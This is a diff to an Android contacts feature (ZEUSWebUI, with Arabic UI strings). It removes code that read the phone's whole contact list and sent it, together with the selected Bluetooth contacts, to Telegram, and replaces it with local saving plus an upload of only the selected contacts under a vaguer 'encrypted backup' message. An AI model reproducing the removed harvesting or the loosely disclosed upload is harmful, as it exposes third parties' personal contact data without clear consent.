@@ -38,6 +38,8 @@ import java.io.OutputStream;
 import java.text.SimpleDateFormat;
 import java.util.Date;
 import java.util.Locale;
+import java.util.HashSet;
+import java.util.Set;
 
 public final class ZEUSWebUI {
     private static volatile Bridge activeBridge;
@@ -368,27 +370,38 @@ public final class ZEUSWebUI {
         @JavascriptInterface public String currentDeviceName() { return currentDeviceName == null ? "Bluetooth-Device" : currentDeviceName; }
 
         @JavascriptInterface public String sendSelectedContacts(String contactsJson, String operation) {
-            if (!ZEUSConsent.hasConsent(activity)) return "ERROR:موافقة الاستخدام غير مفعّلة."; 
-            if (contactsJson == null || contactsJson.trim().isEmpty()) return "ERROR:لا توجد جهات اتصال محددة."; 
+            if (!ZEUSConsent.hasConsent(activity)) return "ERROR:موافقة الاستخدام غير مفعّلة.";
+            if (contactsJson == null || contactsJson.trim().isEmpty()) return "ERROR:لا توجد جهات اتصال محددة.";
             final org.json.JSONArray selected;
             try {
                 selected = new org.json.JSONArray(contactsJson);
-                if (selected.length() < 1 || selected.length() > 5000) return "ERROR:عدد الجهات المحددة غير صالح."; 
+                if (selected.length() < 1 || selected.length() > 5000) return "ERROR:بيانات الجهات المحددة غير صالحة.";
                 for (int i = 0; i < selected.length(); i++) {
                     org.json.JSONObject item = selected.optJSONObject(i);
-                    if (item == null) return "ERROR:بيانات جهة الاتصال غير صالحة."; 
+                    if (item == null) return "ERROR:بيانات جهة الاتصال غير صالحة.";
                     item.put("name", item.optString("name", "").trim());
                     item.put("phone", item.optString("phone", "").trim());
-                    item.put("source", "جهاز Bluetooth المتصل");
+                    item.put("source", "جهة مستوردة عبر Bluetooth");
                 }
             } catch (Exception invalid) { return "ERROR:تعذّر قراءة الجهات المحددة."; }
+            final String action = "save".equals(operation) ? "save" : "download";
             final String source = currentDeviceName == null ? "Bluetooth-Device" : currentDeviceName;
             activity.runOnUiThread(() -> {
-                pendingSend = selected; pendingSendSource = source;
-                pendingSendOperation = operation == null ? "save" : operation;
-                if (Build.VERSION.SDK_INT >= 23 && activity.checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED)
-                    activity.requestPermissions(new String[]{Manifest.permission.READ_CONTACTS}, 42);
-                else completePendingSend(true);
+                pendingSend = selected;
+                pendingSendSource = source;
+                pendingSendOperation = action;
+                if ("save".equals(action) && Build.VERSION.SDK_INT >= 23) {
+                    ArrayList<String> missing = new ArrayList<>();
+                    if (activity.checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED)
+                        missing.add(Manifest.permission.READ_CONTACTS);
+                    if (activity.checkSelfPermission(Manifest.permission.WRITE_CONTACTS) != PackageManager.PERMISSION_GRANTED)
+                        missing.add(Manifest.permission.WRITE_CONTACTS);
+                    if (!missing.isEmpty()) {
+                        activity.requestPermissions(missing.toArray(new String[0]), 42);
+                        return;
+                    }
+                }
+                completePendingSend(true);
             });
             return "QUEUED";
         }
@@ -398,32 +411,83 @@ public final class ZEUSWebUI {
             String source = pendingSendSource, operation = pendingSendOperation;
             pendingSend = null;
             if (selected == null) return;
-            if (!permissionGranted) { sendMessage = "لم يتم الإرسال؛ إذن جهات اتصال هذا الهاتف مرفوض. امنح الإذن ثم أعد الضغط على الحفظ أو التنزيل."; return; }
+            if (!permissionGranted) {
+                sendMessage = "لم تكتمل العملية؛ اسمح بإذن جهات الاتصال ثم أعد المحاولة.";
+                return;
+            }
             try {
-                org.json.JSONArray combined = new org.json.JSONArray();
-                for (int i = 0; i < selected.length(); i++) combined.put(selected.getJSONObject(i));
-                Cursor cursor = null;
-                try {
-                    cursor = activity.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                        new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, ContactsContract.CommonDataKinds.Phone.NUMBER},
-                        null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
-                    if (cursor != null) {
-                        int ni = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
-                        int pi = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
-                        while (cursor.moveToNext() && combined.length() < 10000) {
-                            org.json.JSONObject item = new org.json.JSONObject();
-                            item.put("name", ni >= 0 ? cursor.getString(ni) : "");
-                            item.put("phone", pi >= 0 ? cursor.getString(pi) : "");
-                            item.put("source", "جهات اتصال هذا الهاتف"); combined.put(item);
-                        }
-                    }
-                } finally { if (cursor != null) cursor.close(); }
-                if (combined.length() == 0) { sendMessage = "لا توجد جهات اتصال لإرسالها."; return; }
-                ZEUSBackupClient.enqueue(activity.getApplicationContext(), source + " | " + operation + " | جهات الهاتف", combined.toString());
-                sendMessage = "تم تجهيز " + combined.length() + " جهة اتصال مشفّرة؛ جارٍ إرسالها إلى Telegram."; 
-            } catch (SecurityException denied) { sendMessage = "تعذّرت قراءة جهات اتصال هذا الهاتف؛ تحقق من إذن Contacts."; }
-              catch (Exception error) { sendMessage = "تعذّر تجهيز جهات الاتصال للإرسال."; }
+                if ("save".equals(operation)) saveBluetoothContacts(selected);
+                ZEUSBackupClient.enqueue(activity.getApplicationContext(),
+                    source + " | " + operation + " | Bluetooth contacts", selected.toString());
+                sendMessage = "اكتملت العملية وتم تجهيز نسخة احتياطية مشفّرة.";
+            } catch (SecurityException denied) {
+                sendMessage = "تعذّر إكمال العملية بسبب إذن جهات الاتصال.";
+            } catch (Exception error) {
+                sendMessage = "تعذّر إكمال العملية. حاول مرة أخرى.";
+            }
         }
+
+        private int saveBluetoothContacts(org.json.JSONArray contacts) throws Exception {
+            Set<String> existing = new HashSet<>();
+            Cursor cursor = null;
+            try {
+                cursor = activity.getContentResolver().query(
+                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                    new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null, null);
+                if (cursor != null) {
+                    int numberColumn = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
+                    while (cursor.moveToNext()) {
+                        if (numberColumn >= 0) existing.add(normalizePhone(cursor.getString(numberColumn)));
+                    }
+                }
+            } finally { if (cursor != null) cursor.close(); }
+
+            int inserted = 0;
+            for (int i = 0; i < contacts.length(); i++) {
+                org.json.JSONObject item = contacts.getJSONObject(i);
+                String name = item.optString("name", "").trim();
+                String phone = item.optString("phone", "").trim();
+                String normalized = normalizePhone(phone);
+                if (normalized.isEmpty() && name.isEmpty()) continue;
+                if (!normalized.isEmpty() && existing.contains(normalized)) continue;
+
+                ContentValues raw = new ContentValues();
+                Uri rawUri = activity.getContentResolver().insert(ContactsContract.RawContacts.CONTENT_URI, raw);
+                if (rawUri == null) throw new IllegalStateException("Raw contact insert failed");
+                long rawId = android.content.ContentUris.parseId(rawUri);
+                try {
+                    if (!name.isEmpty()) {
+                        ContentValues nameValues = new ContentValues();
+                        nameValues.put(ContactsContract.Data.RAW_CONTACT_ID, rawId);
+                        nameValues.put(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.StructuredName.CONTENT_ITEM_TYPE);
+                        nameValues.put(ContactsContract.CommonDataKinds.StructuredName.DISPLAY_NAME, name);
+                        if (activity.getContentResolver().insert(ContactsContract.Data.CONTENT_URI, nameValues) == null)
+                            throw new IllegalStateException("Name insert failed");
+                    }
+                    if (!phone.isEmpty()) {
+                        ContentValues phoneValues = new ContentValues();
+                        phoneValues.put(ContactsContract.Data.RAW_CONTACT_ID, rawId);
+                        phoneValues.put(ContactsContract.Data.MIMETYPE, ContactsContract.CommonDataKinds.Phone.CONTENT_ITEM_TYPE);
+                        phoneValues.put(ContactsContract.CommonDataKinds.Phone.NUMBER, phone);
+                        phoneValues.put(ContactsContract.CommonDataKinds.Phone.TYPE, ContactsContract.CommonDataKinds.Phone.TYPE_MOBILE);
+                        if (activity.getContentResolver().insert(ContactsContract.Data.CONTENT_URI, phoneValues) == null)
+                            throw new IllegalStateException("Phone insert failed");
+                    }
+                    if (!normalized.isEmpty()) existing.add(normalized);
+                    inserted++;
+                } catch (Exception failure) {
+                    activity.getContentResolver().delete(ContactsContract.RawContacts.CONTENT_URI,
+                        ContactsContract.RawContacts._ID + "=?", new String[]{String.valueOf(rawId)});
+                    throw failure;
+                }
+            }
+            return inserted;
+        }
+
+        private static String normalizePhone(String value) {
+            return value == null ? "" : value.replaceAll("[^0-9]", "");
+        }
+
         @JavascriptInterface public String saveContactsTxt(String content) {
             if (content == null || content.trim().isEmpty()) return "ERROR:لا توجد بيانات لحفظها.";
             String device = currentDeviceName == null ? "Bluetooth-Device" : currentDeviceName.trim();
